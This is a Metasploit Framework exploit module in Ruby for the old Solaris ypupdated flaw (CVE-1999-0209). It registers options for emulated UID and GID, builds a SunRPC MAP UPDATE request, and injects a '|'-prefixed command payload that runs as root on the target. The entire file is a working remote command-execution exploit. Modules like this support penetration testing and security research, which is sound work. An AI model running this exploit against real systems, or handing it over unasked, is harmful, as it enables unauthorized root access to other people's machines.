##
# $Id: ypupdated_exec.rb 9929 2010-07-25 21:37:54Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::SunRPC

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Solaris ypupdated Command Execution',
			'Description'    => %q{
				This exploit targets a weakness in the way the ypupdated RPC
				application uses the command shell when handling a MAP UPDATE
				request.  Extra commands may be launched through this command
				shell, which runs as root on the remote host, by passing
				commands in the format '|<command>'.

				Vulnerable systems include Solaris 2.7, 8, 9, and 10, when
				ypupdated is started with the '-i' command-line option.
			},
			'Author'         => [ 'I)ruid <druid@caughq.org>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9929 $',
			'References'     =>
				[
					['CVE', '1999-0209'],
					['OSVDB', '11517'],
					['BID', '1749'],
				],
			'Privileged'     => true,
			'Platform'       => ['unix', 'solaris'],
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					'Space'    => 1024,
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl telnet',
						}
				},
			'Targets'        => [ ['Automatic', { }], ],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Dec 12 1994'
		))

		register_options(
			[
				OptString.new('HOSTNAME', [false, 'Remote hostname', 'localhost']),
				OptInt.new('GID', [false, 'GID to emulate', 0]),
				OptInt.new('UID', [false, 'UID to emulate', 0])
			], self.class
		)
	end

	def exploit
		hostname  = datastore['HOSTNAME']
		program   = 100028
		progver   = 1
		procedure = 1

		print_status('Sending PortMap request for ypupdated program')
		pport = sunrpc_create('udp', program, progver)

		print_status("Sending MAP UPDATE request with command '#{payload.encoded}'")
		print_status('Waiting for response...')
		sunrpc_authunix(hostname, datastore['UID'], datastore['GID'], [])
		command = '|' + payload.encoded
		msg = XDR.encode(command, 2, 0x78000000, 2, 0x78000000)
		sunrpc_call(procedure, msg)

		sunrpc_destroy

		print_status('No Errors, appears to have succeeded!')
	rescue ::Rex::Proto::SunRPC::RPCTimeout
		print_error('Warning: ' + $!)
	end

end